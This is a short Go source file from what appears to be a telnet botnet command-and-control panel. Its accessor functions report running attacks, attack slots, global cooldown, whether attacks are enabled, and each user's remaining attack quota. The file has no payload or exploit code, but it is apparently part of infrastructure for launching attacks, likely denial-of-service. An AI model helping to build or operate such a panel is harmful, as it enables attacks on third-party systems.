package packages

import (
	"advanced-telnet-cnc/source/config"
	"advanced-telnet-cnc/source/database"
)

type Attacks struct {
	Running, Slots, Cooldown int
	Enabled                  bool

	AttacksLeft int `lufx:"Left"`
}

func AttacksRunning() int {
	running, err := database.RunningAttacks()
	if err != nil {
		config.Logger.Error(err)
		return 0
	}

	return len(running)
}

func AttacksLeft(profile *database.UserProfile) int {
	left, _, err := profile.Attacks()
	if err != nil {
		config.Logger.Error(err)
		return 0
	}

	return left
}

func AttacksSlots() int {
	return config.Master.AttackSlots
}

func AttacksEnabled() bool {
	return config.Master.Attacks
}

func AttacksCooldown() int {
	return config.Master.GlobalCooldown
}
